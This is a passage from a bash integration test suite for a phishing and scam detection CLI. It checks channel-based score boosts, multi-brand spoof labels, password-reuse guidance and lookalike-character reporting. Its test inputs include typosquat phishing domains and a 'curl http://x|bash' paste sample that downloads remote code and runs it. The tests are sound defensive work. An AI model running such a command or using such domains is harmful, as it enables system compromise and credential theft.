    && check "safe-dest: g00gle → google.com" "0" "0" \
    || check "safe-dest: g00gle → google.com" "0" "1"

# ─── Perspective 10: Delivery Channel Context (--from) ─────────────────────
# Socratic Q: "The same URL in an unsolicited SMS is riskier than one the user
# typed manually.  Should the delivery channel change the verdict?"

# --from qr boosts a BLOCK URL to ISOLATE (score 60 + 20 = 80)
FROM_QR_OUT=$(./hlse_core --from qr "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_QR_OUT" | grep -q "ISOLATE" && check "--from qr: boosts to ISOLATE" "0" "0" \
    || check "--from qr: boosts to ISOLATE" "0" "1"

# --from sms shows channel reason in output
FROM_SMS_OUT=$(./hlse_core --from sms "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_SMS_OUT" | grep -q "Channel (sms)" && check "--from sms: channel reason shown" "0" "0" \
    || check "--from sms: channel reason shown" "0" "1"

# --from email shows correct delta in output
FROM_EMAIL_OUT=$(./hlse_core --from email "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_EMAIL_OUT" | grep -q "Channel (email): +10" && check "--from email: +10 reason shown" "0" "0" \
    || check "--from email: +10 reason shown" "0" "1"

# --from dm shows correct delta in output
FROM_DM_OUT=$(./hlse_core --from dm "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_DM_OUT" | grep -q "Channel (dm): +10" && check "--from dm: +10 reason shown" "0" "0" \
    || check "--from dm: +10 reason shown" "0" "1"

# --from manual produces NO channel reason (delta=0, no noise)
FROM_MAN_OUT=$(./hlse_core --from manual "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_MAN_OUT" | grep -q "Channel" && check "--from manual: no channel reason" "0" "1" \
    || check "--from manual: no channel reason" "0" "0"

# --from does NOT affect text (only URLs get the channel prior)
FROM_TEXT_OUT=$(./hlse_core --from sms text "URGENT wire transfer now" 2>/dev/null) || true
echo "$FROM_TEXT_OUT" | grep -q "Channel" && check "--from ignored for text input" "0" "1" \
    || check "--from ignored for text input" "0" "0"

# --from with invalid channel exits 2
FC=0; ./hlse_core --from fax "https://paypa1.com" >/dev/null 2>&1 || FC=$?
check "--from invalid channel: exit 2" "2" "$FC"

# JSON includes channel / channel_delta / effective_score / effective_action
FROM_JSON=""; FROM_JSON=$(./hlse_core --json --from sms "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("channel") == "sms", d
assert d.get("channel_delta") == 15, d
assert d.get("effective_score") == 75, d
assert d.get("effective_action") in ("SAFE","LOG","ALERT","BLOCK","ISOLATE"), d
' && check "--from json: channel fields present" "0" "0" \
   || check "--from json: channel fields present" "0" "1"

# JSON --from qr: effective_score capped correctly (60 + 20 = 80)
FROM_QR_JSON=""; FROM_QR_JSON=$(./hlse_core --json --from qr "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_QR_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("channel") == "qr", d
assert d.get("channel_delta") == 20, d
assert d.get("effective_score") == 80, d
assert d.get("effective_action") == "ISOLATE", d
' && check "--from qr json: effective_score=80, effective_action=ISOLATE" "0" "0" \
   || check "--from qr json: effective_score=80, effective_action=ISOLATE" "0" "1"

# stdin + --from sms: channel reason emitted in text output
FROM_STDIN_OUT=$(echo "https://paypa1.com/login" | ./hlse_core --from sms --stdin 2>/dev/null) || true
echo "$FROM_STDIN_OUT" | grep -q "Channel (sms)" && check "--from sms stdin: channel reason shown" "0" "0" \
    || check "--from sms stdin: channel reason shown" "0" "1"

# stdin + --from qr: effective score used for header line
FROM_STDIN_QR=$(echo "https://paypa1.com/login" | ./hlse_core --from qr --stdin 2>/dev/null) || true
echo "$FROM_STDIN_QR" | grep -q "ISOLATE" && check "--from qr stdin: header shows ISOLATE" "0" "0" \
    || check "--from qr stdin: header shows ISOLATE" "0" "1"

# Help lists --from
./hlse_core --help 2>&1 | grep -q "\-\-from" && check "help: lists --from" "0" "0" \
    || check "help: lists --from" "0" "1"

# Help lists all subcommands documented in the spec
./hlse_core --help 2>&1 | grep -q "esp"       && check "help: lists esp" "0" "0"       || check "help: lists esp" "0" "1"
./hlse_core --help 2>&1 | grep -q "secret"    && check "help: lists secret" "0" "0"    || check "help: lists secret" "0" "1"
./hlse_core --help 2>&1 | grep -q "email"     && check "help: lists email" "0" "0"     || check "help: lists email" "0" "1"
./hlse_core --help 2>&1 | grep -q "clipboard" && check "help: lists clipboard" "0" "0" || check "help: lists clipboard" "0" "1"

# ─── JSON action-band consistency (SPECIFICATION.md §5.2, GAP-G) ─────

action_ok() {
    # $1 = label, $2 = JSON; assert "action" is a valid band
    echo "$2" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("action") in ("SAFE","LOG","ALERT","BLOCK","ISOLATE"), d
' && check "json action: $1" "0" "0" || check "json action: $1" "0" "1"
}
action_ok url       "$(./hlse_core --json 'https://g00gle.com')"
action_ok text      "$(./hlse_core --json text 'URGENT wire transfer now')"
action_ok package   "$(./hlse_core --json package reqeusts pip)"
action_ok paste     "$(./hlse_core --json paste 'curl http://x|bash')"
action_ok network   "$(./hlse_core --json network)"
action_ok secret    "$(./hlse_core --json secret 'key=AKIA2E3MWORQXYZ4567PQ')"
action_ok email     "$(./hlse_core --json email 'From: Microsoft <h@gmail.com>')"
action_ok clipboard "$(./hlse_core --json clipboard '0xabcdef0000000000000000000000000000c0ffee' '0xabcdef1111111111111111111111111111c0ffee')"
action_ok audit     "$(./hlse_core --json audit)"
action_ok file      "$(./hlse_core --json file /etc/hosts)"

# ─── Perspective 17: Multi-Brand Co-Spoof Pattern Label ─────────────────────

# Socratic question: "What if the URL wears two masks at once — PayPal in the
# subdomain, Apple in the SLD? Should the pattern label reveal compound intent?"

# paypal (subdomain) + apple (SLD) co-spoof: pattern label must say multi-brand
P17_OUT=$(./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P17_OUT" | grep -q "multi-brand co-spoof" \
    && check "p17: paypal+apple co-spoof: pattern=multi-brand" "0" "0" \
    || check "p17: paypal+apple co-spoof: pattern=multi-brand" "0" "1"

# microsoft (subdomain) + apple (SLD) co-spoof: pattern label correct
P17_MS=$(./hlse_core "https://microsoft.apple-support.net/verify" 2>/dev/null) || true
echo "$P17_MS" | grep -q "multi-brand co-spoof" \
    && check "p17: microsoft+apple co-spoof: pattern=multi-brand" "0" "0" \
    || check "p17: microsoft+apple co-spoof: pattern=multi-brand" "0" "1"

# single-brand URL must NOT get multi-brand label (regression guard)
P17_SINGLE=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P17_SINGLE" | grep -q "multi-brand co-spoof" \
    && check "p17: single-brand NOT labelled multi-brand" "0" "1" \
    || check "p17: single-brand NOT labelled multi-brand" "0" "0"

# JSON: pattern field for co-spoof URL contains multi-brand label
P17_JSON=$(./hlse_core --json "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P17_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "multi-brand" in d.get("pattern",""), d
' && check "p17 json: pattern=multi-brand co-spoof" "0" "0" \
   || check "p17 json: pattern=multi-brand co-spoof" "0" "1"

# ─── Exit gate: --from channel boost must raise exit code ───────────────────

# https://support-helpdesk.info/reset scores 55 (ALERT) — below BLOCK threshold.
# Without --from: exits 0.  With --from qr (+20 → 75): must exit 1.
GATE_RAW=0; ./hlse_core "https://support-helpdesk.info/reset" >/dev/null 2>&1 \
    || GATE_RAW=$?
check "exit-gate: raw ALERT score exits 0" "0" "$GATE_RAW"

GATE_QR=0; ./hlse_core --from qr "https://support-helpdesk.info/reset" >/dev/null 2>&1 \
    || GATE_QR=$?
check "exit-gate: QR-boosted score exits 1" "1" "$GATE_QR"

# stdin path: --from qr must also raise exit code
GATE_STDIN=0; echo "https://support-helpdesk.info/reset" \
    | ./hlse_core --from qr --stdin >/dev/null 2>&1 || GATE_STDIN=$?
check "exit-gate stdin: QR-boosted exits 1" "1" "$GATE_STDIN"

# --from manual (delta=0) must not change exit code
GATE_MAN=0; ./hlse_core --from manual "https://support-helpdesk.info/reset" >/dev/null 2>&1 \
    || GATE_MAN=$?
check "exit-gate: --from manual unchanged (exits 0)" "0" "$GATE_MAN"

# ─── Perspective 18: Password-Reuse Cascade Risk ────────────────────────────

# Socratic question: "You named the primary target. But 65% of people reuse
# passwords. Credential-stuffing bots test stolen logins across hundreds of
# services within minutes. Shouldn't post-click guidance name the cascade?"

# BLOCK URL (PayPal typosquat): cascade risk must appear
P18_BLOCK=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P18_BLOCK" | grep -q "Also change" \
    && check "p18: BLOCK URL shows cascade risk" "0" "0" \
    || check "p18: BLOCK URL shows cascade risk" "0" "1"

# Financial brand cascade: mentions email (recovery gateway)
echo "$P18_BLOCK" | grep -q "recovery gateway" \
    && check "p18: financial cascade mentions email recovery gateway" "0" "0" \
    || check "p18: financial cascade mentions email recovery gateway" "0" "1"

# ALERT URL (score 55): cascade risk must NOT appear (pre-click, < 60)
P18_ALERT=$(./hlse_core "https://support-helpdesk.info/reset" 2>/dev/null) || true
echo "$P18_ALERT" | grep -q "Also change" \
    && check "p18: ALERT URL does NOT show cascade risk" "0" "1" \
    || check "p18: ALERT URL does NOT show cascade risk" "0" "0"

# Multi-brand co-spoof: compound cascade guidance
P18_COBRAND=$(./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P18_COBRAND" | grep -q "two credential classes" \
    && check "p18: co-spoof cascade mentions two credential classes" "0" "0" \
    || check "p18: co-spoof cascade mentions two credential classes" "0" "1"

# Crypto brand: cascade mentions irreversibility
P18_CRYPTO=$(./hlse_core "https://metamask-wallet-connect.com/verify" 2>/dev/null) || true
echo "$P18_CRYPTO" | grep -q "Also change" \
    && check "p18: crypto cascade risk shown" "0" "0" \
    || check "p18: crypto cascade risk shown" "0" "1"

# Safe URL: no cascade risk (score == 0)
P18_SAFE=$(./hlse_core "https://paypal.com" 2>/dev/null) || true
echo "$P18_SAFE" | grep -q "Also change" \
    && check "p18: safe URL no cascade risk" "0" "1" \
    || check "p18: safe URL no cascade risk" "0" "0"

# JSON: BLOCK URL includes cascade_risk field
P18_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P18_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "cascade_risk" in d, d
assert len(d["cascade_risk"]) > 0, d
' && check "p18 json: cascade_risk field present for BLOCK" "0" "0" \
   || check "p18 json: cascade_risk field present for BLOCK" "0" "1"

# JSON: safe URL must NOT include cascade_risk field
P18_SAFE_JSON=$(./hlse_core --json "https://paypal.com" 2>/dev/null) || true
echo "$P18_SAFE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "cascade_risk" not in d, d
' && check "p18 json: no cascade_risk for safe URL" "0" "0" \
   || check "p18 json: no cascade_risk for safe URL" "0" "1"

# ─── Perspective 19: Compound Objective for Multi-Brand Co-Spoof ────────────

# Socratic question: "For multi-brand URLs the objective line showed only the
# first brand's target. The second brand's credential class was unnamed.
# Shouldn't the ◉ line name BOTH assets at risk?"

# Multi-brand: objective line must say "compound theft"
P19_COBRAND=$(./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P19_COBRAND" | grep -q "compound theft" \
    && check "p19: multi-brand objective=compound theft" "0" "0" \
    || check "p19: multi-brand objective=compound theft" "0" "1"

# Multi-brand: both brands must appear in objective line
echo "$P19_COBRAND" | grep "goal:" | grep -q "paypal" \
    && check "p19: compound objective names paypal" "0" "0" \
    || check "p19: compound objective names paypal" "0" "1"

echo "$P19_COBRAND" | grep "goal:" | grep -q "apple" \
    && check "p19: compound objective names apple" "0" "0" \
    || check "p19: compound objective names apple" "0" "1"

# Single-brand: objective must be the full descriptive string (not "compound")
P19_SINGLE=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P19_SINGLE" | grep "goal:" | grep -q "compound" \
    && check "p19: single-brand NOT compound objective" "0" "1" \
    || check "p19: single-brand NOT compound objective" "0" "0"

echo "$P19_SINGLE" | grep "goal:" | grep -q "financial-account takeover" \
    && check "p19: single-brand keeps full objective text" "0" "0" \
    || check "p19: single-brand keeps full objective text" "0" "1"

# JSON: objective field reflects compound for co-spoof
P19_JSON=$(./hlse_core --json "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P19_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
obj = d.get("objective", "")
assert "compound theft" in obj, obj
assert "paypal" in obj, obj
assert "apple" in obj, obj
assert "financial" in obj, obj
assert "identity" in obj, obj
' && check "p19 json: compound objective has both brands+classes" "0" "0" \
   || check "p19 json: compound objective has both brands+classes" "0" "1"

# JSON: single-brand objective unchanged from pre-p19
P19_SINGLE_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P19_SINGLE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
obj = d.get("objective", "")
assert "compound" not in obj, obj
assert "financial" in obj, obj
' && check "p19 json: single-brand objective unchanged" "0" "0" \
   || check "p19 json: single-brand objective unchanged" "0" "1"

# ─── Perspective 20: ASCII Lookalike Character Diff ─────────────────────────

# Socratic question: "You say 'compare the address bar character by character'
# without saying WHICH character. What if you pointed to EXACTLY which
# position is the impostor? That turns abstract 'edit distance 1' into proof."

# paypa1.com: char 6 is digit '1' masking letter 'l'
P20_PAYPA1=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P20_PAYPA1" | grep -q "ASCII lookalike" \
    && check "p20: paypa1 shows ASCII lookalike line" "0" "0" \
    || check "p20: paypa1 shows ASCII lookalike line" "0" "1"

echo "$P20_PAYPA1" | grep "ASCII lookalike" | grep -q "char 6" \
    && check "p20: paypa1 pinpoints char 6" "0" "0" \
    || check "p20: paypa1 pinpoints char 6" "0" "1"

echo "$P20_PAYPA1" | grep "ASCII lookalike" | grep -q "digit.*1.*masking.*letter.*l" \
    && check "p20: paypa1 labels digit masking letter" "0" "0" \
    || check "p20: paypa1 labels digit masking letter" "0" "1"

# g00gle.com: chars 2 and 3 are digit '0' masking 'o'
P20_G00GLE=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$P20_G00GLE" | grep -q "ASCII lookalike" \
    && check "p20: g00gle shows ASCII lookalike line" "0" "0" \
    || check "p20: g00gle shows ASCII lookalike line" "0" "1"

echo "$P20_G00GLE" | grep "ASCII lookalike" | grep -q "char 2" \
    && check "p20: g00gle pinpoints char 2" "0" "0" \
    || check "p20: g00gle pinpoints char 2" "0" "1"

# Non-ASCII host: must NOT fire (hlse_confusable_report handles it)
P20_IDN=""; P20_IDN=$(./hlse_core "https://www.xn--pypal-4ve.com" 2>/dev/null) || true
echo "$P20_IDN" | grep -q "ASCII lookalike" \
    && check "p20: non-ASCII host skips ascii_diff" "0" "1" \
    || check "p20: non-ASCII host skips ascii_diff" "0" "0"

# Clean URL: no ASCII lookalike line
P20_CLEAN=$(./hlse_core "https://paypal.com" 2>/dev/null) || true
echo "$P20_CLEAN" | grep -q "ASCII lookalike" \
    && check "p20: safe URL no ascii diff" "0" "1" \
    || check "p20: safe URL no ascii diff" "0" "0"

# JSON: ascii_diff field present for homoglyph URL
P20_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P20_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "ascii_diff" in d, d
assert "char 6" in d["ascii_diff"], d["ascii_diff"]
' && check "p20 json: ascii_diff field has char 6" "0" "0" \
   || check "p20 json: ascii_diff field has char 6" "0" "1"

# ─── results ────────────────────────────────────────────────────────────

echo ""
echo "═════════════════════════════════"
echo "  CLI Integration: $PASS passed, $FAIL failed"
echo "═════════════════════════════════"

[ "$FAIL" -eq 0 ]
